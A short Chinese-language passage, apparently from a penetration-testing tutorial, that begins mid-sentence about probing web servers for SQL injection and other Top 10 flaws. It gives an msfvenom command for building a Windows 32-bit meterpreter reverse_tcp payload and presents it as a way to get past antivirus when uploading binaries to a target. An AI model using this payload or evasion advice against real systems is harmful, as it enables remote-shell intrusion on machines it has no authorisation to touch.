    Suite 允许你针对 Top 10 中的任何漏洞与具有潜在 SQL 注入的服务器交互。除非你的时间非常紧，否则不要这样做：你无法预先知道 Web 应用程序——或者服务器会发生什么。当你向目标上传文件时，很有可能某些防病毒软件会检测到你的二进制文件。请使用
    `msfvenom` 针对 Windows 32 位进行编码：`msfvenom -a x86 -platform windows -p meterpreter/reverse_tcp`


